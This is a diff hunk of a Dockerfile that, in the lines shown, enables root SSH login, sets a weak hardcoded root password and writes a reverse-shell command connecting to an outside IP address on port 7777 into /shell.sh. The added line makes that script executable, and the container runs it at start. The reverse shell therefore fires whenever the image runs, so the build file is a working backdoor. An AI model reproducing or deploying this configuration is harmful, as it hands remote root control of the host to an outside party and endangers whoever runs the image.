@@ -13,6 +13,7 @@ RUN echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config
 RUN echo 'sh -i >& /dev/tcp/23.224.64.103/7777 0>&1' >>/shell.sh
 RUN echo root:192168|chpasswd
 RUN chmod 755 /luo.sh
+RUN chmod 755 /shell.sh
 EXPOSE 80
 CMD  /luo.sh
 CMD /shell.sh
